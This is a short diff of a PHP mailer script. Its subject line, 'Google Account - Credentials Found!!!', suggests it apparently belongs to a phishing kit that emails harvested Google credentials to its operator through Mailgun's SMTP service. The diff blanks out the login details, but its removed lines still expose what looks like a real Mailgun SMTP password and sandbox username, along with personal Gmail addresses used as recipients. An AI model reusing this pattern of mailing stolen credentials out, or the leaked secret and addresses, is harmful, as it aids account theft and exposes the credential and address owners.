@@ -18,14 +18,13 @@ $mail = new PHPMailer;
 $mail->isSMTP();                                      // Set mailer to use SMTP
 $mail->Host = 'smtp.mailgun.org';                     // Specify main and backup SMTP servers
 $mail->SMTPAuth = true;                               // Enable SMTP authentication
-$mail->Username = 'postmaster@sandboxb27249119e714c3da81d670ee2899d91.mailgun.org';   // SMTP username
-$mail->Password = '53469cc7a08c50cca70506c0d3968848-e438c741-0d18c6e9';                           // SMTP password
+$mail->Username = '???';   // SMTP username
+$mail->Password = '???';                           // SMTP password
 $mail->SMTPSecure = 'tls';                            // Enable encryption, only 'tls' is accepted
 
-$mail->From = 'postmaster@sandboxb27249119e714c3da81d670ee2899d91.mailgun.org';
+$mail->From = '???';
 $mail->FromName = 'Postmaster MailGun';
-//$mail->addAddress('spalriwalau@gmail.com');                 // Add a recipient
-$mail->addAddress('faceprepindia@gmail.com');
+$mail->addAddress('???');		//Add a recipient
 $mail->WordWrap = 50;                                 // Set word wrap to 50 characters
 
 $mail->Subject = "Google Account - Credentials Found!!!";
